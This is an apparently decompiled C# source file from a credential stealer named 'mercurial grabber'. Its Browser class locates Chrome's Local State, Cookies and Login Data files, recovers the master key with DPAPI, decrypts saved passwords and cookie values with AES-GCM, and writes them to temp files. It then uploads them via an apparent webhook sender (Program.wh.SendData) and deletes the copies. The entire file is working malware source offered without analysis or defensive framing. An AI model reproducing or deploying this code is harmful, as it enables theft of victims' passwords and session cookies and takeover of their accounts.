using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer
{
	// Token: 0x0200000A RID: 10
	internal class Browser
	{
		// Token: 0x0600002A RID: 42 RVA: 0x00002F58 File Offset: 0x00001158
		private static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
		{
			byte[] array = new byte[12];
			byte[] array2 = array;
			Array.Copy(encryptedData, 3, array2, 0, 12);
			string result;
			try
			{
				byte[] array3 = new byte[encryptedData.Length - 15];
				Array.Copy(encryptedData, 15, array3, 0, encryptedData.Length - 15);
				byte[] array4 = new byte[16];
				byte[] array5 = new byte[array3.Length - array4.Length];
				Array.Copy(array3, array3.Length - 16, array4, 0, 16);
				Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
				AesGcm aesGcm = new AesGcm();
				string @string = Encoding.UTF8.GetString(aesGcm.Decrypt(MasterKey, array2, null, array5, array4));
				result = @string;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x0000300C File Offset: 0x0000120C
		private static byte[] GetMasterKey()
		{
			string path = User.localAppData + "\\Google\\Chrome\\User Data\\Local State";
			byte[] array = new byte[0];
			if (!File.Exists(path))
			{
				return null;
			}
			MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
			foreach (object obj in matchCollection)
			{
				Match match = (Match)obj;
				if (match.Success)
				{
					array = Convert.FromBase64String(match.Groups[1].Value);
				}
			}
			byte[] array2 = new byte[array.Length - 5];
			Array.Copy(array, 5, array2, 0, array.Length - 5);
			byte[] result;
			try
			{
				result = ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00003100 File Offset: 0x00001300
		public static void StealCookies()
		{
			string text = User.localAppData + "\\Google\\Chrome\\User Data\\default\\Cookies";
			string text2 = User.tempFolder + "\\cookies.db";
			if (File.Exists(text))
			{
				Console.WriteLine("Located: " + text);
				try
				{
					File.Copy(text, text2);
				}
				catch
				{
				}
				try
				{
					SQLite sqlite = new SQLite(text2);
					sqlite.ReadTable("cookies");
					StreamWriter streamWriter = new StreamWriter(User.tempFolder + "\\cookies.txt");
					for (int i = 0; i <= sqlite.GetRowCount(); i++)
					{
						string value = sqlite.GetValue(i, 12);
						string value2 = sqlite.GetValue(i, 1);
						string value3 = sqlite.GetValue(i, 2);
						sqlite.GetValue(i, 4);
						string str = "";
						try
						{
							str = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10L * Convert.ToInt64(sqlite.GetValue(i, 5))), TimeZoneInfo.Local));
						}
						catch
						{
						}
						string str2 = string.Empty;
						try
						{
							str2 = Browser.DecryptWithKey(Encoding.Default.GetBytes(value), Browser.GetMasterKey());
						}
						catch
						{
							str2 = "Error in deryption";
						}
						streamWriter.WriteLine("---------------- mercurial grabber ----------------");
						streamWriter.WriteLine("value: " + str2);
						streamWriter.WriteLine("hostKey: " + value2);
						streamWriter.WriteLine("name: " + value3);
						streamWriter.WriteLine("expires: " + str);
					}
					streamWriter.Close();
					File.Delete(text2);
					Program.wh.SendData("", "cookies.txt", User.tempFolder + "\\cookies.txt", "multipart/form-data");
					File.Delete(User.tempFolder + "\\cookies.txt");
					return;
				}
				catch (Exception ex)
				{
					Program.wh.SendData("", "cookies.db", User.tempFolder + "\\cookies.db", "multipart/form-data");
					Program.wh.Send("`" + ex.Message + "`");
					return;
				}
			}
			Program.wh.Send("`Did not find: " + text + "`");
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000338C File Offset: 0x0000158C
		public static void StealPasswords()
		{
			string text = User.localAppData + "\\Google\\Chrome\\User Data\\default\\Login Data";
			Console.WriteLine(text);
			if (File.Exists(text))
			{
				string text2 = User.tempFolder + "\\login.db";
				Console.WriteLine("copy to " + text2);
				try
				{
					File.Copy(text, text2);
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.Message);
				}
				try
				{
					SQLite sqlite = new SQLite(text2);
					sqlite.ReadTable("logins");
					StreamWriter streamWriter = new StreamWriter(User.tempFolder + "\\passwords.txt");
					for (int i = 0; i <= sqlite.GetRowCount(); i++)
					{
						string value = sqlite.GetValue(i, 0);
						string value2 = sqlite.GetValue(i, 3);
						string text3 = sqlite.GetValue(i, 5);
						if (value != null && (text3.StartsWith("v10") || text3.StartsWith("v11")))
						{
							byte[] masterKey = Browser.GetMasterKey();
							if (masterKey != null)
							{
								try
								{
									text3 = Browser.DecryptWithKey(Encoding.Default.GetBytes(text3), masterKey);
								}
								catch
								{
									text3 = "Unable to decrypt";
								}
								streamWriter.WriteLine("---------------- mercurial grabber ----------------");
								streamWriter.WriteLine("host: " + value);
								streamWriter.WriteLine("username: " + value2);
								streamWriter.WriteLine("password: " + text3);
							}
						}
					}
					streamWriter.Close();
					File.Delete(text2);
					Program.wh.SendData("", "passwords.txt", User.tempFolder + "\\passwords.txt", "multipart/form-data");
					File.Delete(User.tempFolder + "\\passwords.txt");
					return;
				}
				catch (Exception ex2)
				{
					Program.wh.SendData("", "login.db", User.tempFolder + "\\login.db", "multipart/form-data");
					Program.wh.Send("`" + ex2.Message + "`");
					return;
				}
			}
			Program.wh.Send("`Did not find: " + text + "`");
		}
	}
}
